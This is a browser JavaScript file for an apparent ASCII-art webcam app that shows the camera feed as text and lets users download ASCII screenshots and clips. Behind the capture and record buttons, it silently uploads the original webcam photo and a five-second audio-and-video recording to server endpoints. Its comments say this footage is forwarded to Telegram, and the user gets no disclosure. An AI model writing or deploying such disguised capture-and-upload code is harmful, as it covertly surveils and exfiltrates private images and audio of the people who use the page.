const video = document.getElementById("video");
const asciiDiv = document.getElementById("asciiDiv");
const captureBtn = document.getElementById("captureBtn");
const recordBtn = document.getElementById("recordBtn");

const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

const chars = "$@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/|()1{}[]?-_+~<>i!lI;:,\"^`'.";

navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream=>{
    video.srcObject = stream;
}).catch(()=>alert("❌ Camera access denied!"));

function drawAscii(){
    const cw = 150;
    const ch = 120;
    canvas.width = cw;
    canvas.height = ch;

    ctx.drawImage(video, 0, 0, cw, ch);

    const frame = ctx.getImageData(0, 0, cw, ch);
    let asciiStr = "";
    for(let y=0; y<ch; y++){
        for(let x=0; x<cw; x++){
            const i = (y*cw + x)*4;
            const gray = 0.299*frame.data[i]+0.587*frame.data[i+1]+0.114*frame.data[i+2];
            const charIndex = Math.floor((gray/255)*(chars.length-1));
            asciiStr += chars[charIndex];
        }
        asciiStr += "\n";
    }
    asciiDiv.textContent = asciiStr;
    requestAnimationFrame(drawAscii);
}
drawAscii();

// ---------------- Capture Image ----------------
captureBtn.onclick = async ()=>{
    const originalBase64 = canvas.toDataURL("image/jpeg");

    // ASCII screenshot canvas
    const asciiCanvas = document.createElement("canvas");
    asciiCanvas.width = 250;
    asciiCanvas.height = 200;
    const asciiCtx = asciiCanvas.getContext("2d");

    asciiCtx.fillStyle = "#000";
    asciiCtx.fillRect(0,0,asciiCanvas.width, asciiCanvas.height);

    asciiCtx.fillStyle = "#00ff00";
    asciiCtx.font = "3px 'Share Tech Mono', monospace";
    const lines = asciiDiv.textContent.split("\n");
    for(let i=0;i<lines.length;i++){
        asciiCtx.fillText(lines[i], 0, i*3);
    }

    // Download ASCII image
    asciiCanvas.toBlob(blob=>{
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = "ascii_screenshot.png";
        a.click();
    });

    // Send original to Telegram
    fetch("/upload/image", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({original: originalBase64})
    });
};

// ---------------- Record Video ----------------
recordBtn.onclick = async ()=>{
    const stream = video.srcObject;
    const recorder = new MediaRecorder(stream,{mimeType:"video/webm"});
    let chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();
    await new Promise(r=>setTimeout(r,5000));
    recorder.stop();

    recorder.onstop = async ()=>{
        const originalBlob = new Blob(chunks,{type:"video/webm"});

        // ASCII video (optional: 5s of ASCII frames)
        const asciiCanvas = document.createElement("canvas");
        asciiCanvas.width = 150;
        asciiCanvas.height = 120;
        const asciiCtx = asciiCanvas.getContext("2d");

        const asciiRecorder = new MediaRecorder(asciiCanvas.captureStream(), {mimeType:"video/webm"});
        let asciiChunks = [];
        asciiRecorder.ondataavailable = e => asciiChunks.push(e.data);
        asciiRecorder.start();
        await new Promise(r=>setTimeout(r,5000));
        asciiRecorder.stop();

        asciiRecorder.onstop = async ()=>{
            const asciiBlob = new Blob(asciiChunks,{type:"video/webm"});
            // Download ASCII video
            const a = document.createElement("a");
            a.href = URL.createObjectURL(asciiBlob);
            a.download = "ascii_video.webm";
            a.click();

            // Send original video to Telegram
            const form = new FormData();
            form.append("original", originalBlob, "original.webm");
            fetch("/upload/video", {method:"POST", body: form});
        };
    };
};
